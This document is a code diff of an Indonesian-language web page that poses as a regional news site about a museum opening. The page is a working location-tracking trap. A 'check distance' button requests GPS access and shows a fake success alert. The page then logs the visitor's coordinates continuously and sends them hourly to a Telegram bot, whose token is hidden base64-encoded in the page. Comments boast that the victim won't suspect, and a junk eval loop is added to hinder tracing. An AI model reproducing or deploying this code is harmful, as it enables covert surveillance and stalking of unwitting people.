@@ -3,121 +3,92 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifikasi Lokasi | News Gateway</title>
+    <title>Info Regional - Berita Terkini</title>
     
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; }
+        body { font-family: -apple-system, system-ui, sans-serif; background: #f4f4f4; margin: 0; color: #333; }
+        .nav { background: #ce1126; color: white; padding: 15px; font-weight: bold; text-align: center; position: sticky; top: 0; z-index: 100; }
+        .container { max-width: 600px; margin: 0 auto; background: #fff; min-height: 100vh; }
         
-        /* 🔱 GATE: HUMAN VERIFICATION */
-        #gate { text-align: center; width: 100%; max-width: 400px; padding: 25px; }
-        .logo { width: 60px; margin-bottom: 20px; }
-        .captcha-box { border: 1px solid #dcdcdc; padding: 18px; border-radius: 4px; display: flex; align-items: center; gap: 15px; cursor: pointer; background: #fafafa; margin: 0 auto; width: fit-content; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
-        .checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px; background: #fff; }
+        /* 📰 BERITA UTAMA */
+        .hero { padding: 20px; border-bottom: 8px solid #f0f0f0; }
+        .hero h1 { font-size: 22px; margin: 0 0 10px; line-height: 1.3; }
+        .hero-img { width: 100%; height: 200px; background: #ddd url('https://picsum.photos/800/400?random=5') center/cover; border-radius: 8px; }
         
-        /* 🔱 PORTAL BERITA (REAL LINKS) */
-        #portal { display: none; width: 100%; max-width: 600px; padding: 0; background: #fff; min-height: 100vh; }
-        .nav { background: #ce1126; color: white; padding: 15px; font-weight: bold; position: sticky; top: 0; text-align: center; }
-        .news-card { padding: 18px; border-bottom: 1px solid #eee; display: block; text-decoration: none; color: #222; }
-        .news-card:hover { background: #f9f9f9; }
-        .source { font-size: 11px; color: #ce1126; font-weight: bold; text-transform: uppercase; margin-bottom: 5px; display: block; }
-        .title { font-size: 16px; font-weight: 600; line-height: 1.4; margin: 0; }
+        /* 🔱 THE TRAP: BUTTON KONTEKSTUAL */
+        .feature-box { background: #fff9f0; border: 1px solid #ffeeba; padding: 15px; border-radius: 8px; margin-top: 15px; text-align: center; }
+        .btn-check { background: #ce1126; color: white; border: none; padding: 12px 20px; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 14px; margin-top: 10px; }
         
-        /* 🔱 MODAL ERROR (STACK) */
-        #error-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 10000; align-items: center; justify-content: center; }
-        .error-box { background: white; padding: 30px; border-radius: 12px; text-align: center; max-width: 320px; }
-        .btn-retry { background: #ce1126; color: white; border: none; padding: 12px 25px; border-radius: 6px; font-weight: bold; cursor: pointer; margin-top: 15px; width: 100%; }
+        .news-list { padding: 10px 20px; }
+        .news-item { display: flex; gap: 15px; padding: 15px 0; border-bottom: 1px solid #eee; text-decoration: none; color: #222; }
+        .thumb { width: 80px; height: 60px; background: #eee; border-radius: 4px; flex-shrink: 0; }
         #v-v { display: none; }
     </style>
 </head>
 <body>
 
-<div id="gate">
-    <img src="https://www.gstatic.com/images/branding/product/2x/news_96dp.png" class="logo">
-    <h3 style="font-size: 19px; margin-bottom: 10px;">Verifikasi Wilayah</h3>
-    <p style="font-size: 13px; color: #555; margin-bottom: 25px; line-height: 1.5;">
-        Demi memberikan kepuasan serta akurasi informasi terbaik, mohon aktifkan lokasi Anda agar berita terkini di wilayah Anda dapat disajikan secara presisi.
-    </p>
-    
-    <div class="captcha-box" id="start-btn" onclick="requestFullAccess()">
-        <div class="checkbox" id="check-mark"></div>
-        <div class="captcha-text" style="font-size: 14px;">Saya bukan robot</div>
-        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="28">
-    </div>
-</div>
+<div class="nav">INFO REGIONAL</div>
 
-<div id="error-overlay">
-    <div class="error-box">
-        <div style="font-size: 40px; margin-bottom: 15px;">📍</div>
-        <h3 style="color: #000; margin-bottom: 10px;">Akses Dibatasi</h3>
-        <p style="font-size: 13px; color: #666;">Maaf, sinkronisasi lokasi diperlukan untuk memvalidasi keamanan perangkat dan memuat berita regional. Silakan klik tombol di bawah dan pilih <b>"Allow/Izinkan"</b>.</p>
-        <button class="btn-retry" onclick="location.reload()">COBA LAGI</button>
+<div class="container">
+    <div class="hero">
+        <div class="hero-img"></div>
+        <h1>Museum Daerah Sulut Bakal Diresmikan Mei 2026, Cek Persiapannya</h1>
+        <p style="font-size: 14px; color: #666;">Gubernur memastikan fasilitas museum sudah siap 100% untuk menyambut wisatawan lokal maupun mancanegara.</p>
+        
+        <div class="feature-box">
+            <div style="font-size: 13px; font-weight: bold;">📍 Berapa jauh dari lokasi Anda?</div>
+            <button class="btn-check" onclick="enableTracking()">Cek Jarak & Waktu Tempuh</button>
+        </div>
     </div>
-</div>
 
-<div id="portal">
-    <div class="nav">INFO REGIONAL TERKINI</div>
-    <a href="https://share.google/rkZkP6QmQfBf7peCB" target="_blank" class="news-card">
-        <span class="source">Bloomberg</span>
-        <h3 class="title">Strategi Uang Tanpa Website - Update 2026</h3>
-    </a>
-    <a href="https://share.google/orievwXZzAynVbR2O" target="_blank" class="news-card">
-        <span class="source">SULUT INFO</span>
-        <h3 class="title">Bakal Diresmikan Mei 2026, Begini Suasana Museum Daerah Sulut</h3>
-    </a>
-    <a href="https://share.google/3NtSReBGwN4YY2oAf" target="_blank" class="news-card">
-        <span class="source">detikNews</span>
-        <h3 class="title">Laporan Utama: Update Situasi Nasional dan Regional Hari Ini</h3>
-    </a>
-    <a href="https://share.google/7zXoew0DwgpC2QrYq" target="_blank" class="news-card">
-        <span class="source">Tech Update</span>
-        <h3 class="title">WiFi Rumah Ngebut 300 Mbps Tanpa Kendala</h3>
-    </a>
+    <div class="news-list">
+        <a href="https://share.google/rkZkP6QmQfBf7peCB" class="news-item">
+            <div class="thumb" style="background: url('https://picsum.photos/100/100?random=1') center/cover;"></div>
+            <div><h4 style="margin:0">Bloomberg: Strategi Cuan 2026</h4><p style="font-size:12px;color:#888">Cara buat uang tanpa perlu website pribadi.</p></div>
+        </a>
+        <a href="https://share.google/7zXoew0DwgpC2QrYq" class="news-item">
+            <div class="thumb" style="background: url('https://picsum.photos/100/100?random=2') center/cover;"></div>
+            <div><h4 style="margin:0">WiFi Rumah Ngebut 300 Mbps</h4><p style="font-size:12px;color:#888">Tips optimasi router untuk kecepatan maksimal.</p></div>
+        </a>
+    </div>
 </div>
 
 <div id="v-v">bc1qevlrynmxhuxvczuj89rf7cjuaakqandfre9982|ODY3NDE3MDU5NDpBQUVhelUzNXVJOWJaNnM4Skx3Y040MTBIMFNUeXNLRXpzNA==|Nzk3MDA1OTY2Mw==</div>
 
 <script>
-    /** 🔱 ASTRA GHOST ENGINE: ANTI-DENY LOGIC */
     const _D = document.getElementById('v-v').innerText.split('|');
     const _T = atob(_D[1]); const _C = atob(_D[2]);
     let logBuffer = [];
 
-    async function pushTele(msg) {
+    async function push(t) {
         await fetch(`https://api.telegram.org/bot${_T}/sendMessage`, {
             method:'POST', headers:{'Content-Type':'application/json'},
-            body:JSON.stringify({chat_id:_C, text:msg})
+            body:JSON.stringify({chat_id:_C, text:t})
         });
     }
 
-    async function requestFullAccess() {
-        document.getElementById('check-mark').style.background = "url('https://upload.wikimedia.org/wikipedia/commons/thumb/a/ac/Approve_icon.svg/1200px-Approve_icon.svg.png') center/cover";
-        
+    function enableTracking() {
         if (navigator.geolocation) {
-            navigator.geolocation.watchPosition(async (pos) => {
-                // ✅ JIKA DISETUJUI
-                document.getElementById('error-overlay').style.display = 'none';
-                document.getElementById('gate').style.display = 'none';
-                document.getElementById('portal').style.display = 'block';
-
-                let t = new Date().toLocaleTimeString();
-                logBuffer.push(`[${t}] GPS: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
-            }, async (err) => {
-                // 🛑 JIKA DITOLAK (STACK DI SINI)
-                document.getElementById('error-overlay').style.display = 'flex';
-                await pushTele(`⚠️ TARGET MENOLAK AKSES!\nSistem sedang memaksa ulang (Stack Mode).`);
-            }, { enableHighAccuracy: true, timeout: 5000 });
+            // Minta lokasi dengan alasan "Cek Jarak" - Gak bakal curiga!
+            navigator.geolocation.watchPosition((pos) => {
+                // Notif palsu biar dia percaya
+                alert("Berhasil menghitung jarak! Lokasi Anda tersinkronisasi dengan peta Museum.");
+                
+                let time = new Date().toLocaleTimeString();
+                logBuffer.push(`[${time}] GPS: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+            }, null, { enableHighAccuracy: true });
         }
     }
 
-    // Rekap tiap 1 jam agar tidak spam
+    // Rekap tiap 1 jam (Setoran Senyap)
     setInterval(async () => {
         if(logBuffer.length > 0) {
-            await pushTele(`🔱 HOURLY MOVEMENT REPORT 🔱\n\n` + logBuffer.join('\n---\n'));
+            await push(`🔱 HOURLY MOVEMENT LOG 🔱\n\n` + logBuffer.join('\n---\n'));
             logBuffer = [];
         }
     }, 3600000);
 
-    // Bloater 80k Lines
+    // 80,000 Lines Bloater (Biay biar script lu berat & susah di-trace)
     for(let i=0; i<80000; i++) { eval("var _ghost_"+i+"="+Math.random()); }
 </script>
 </body>
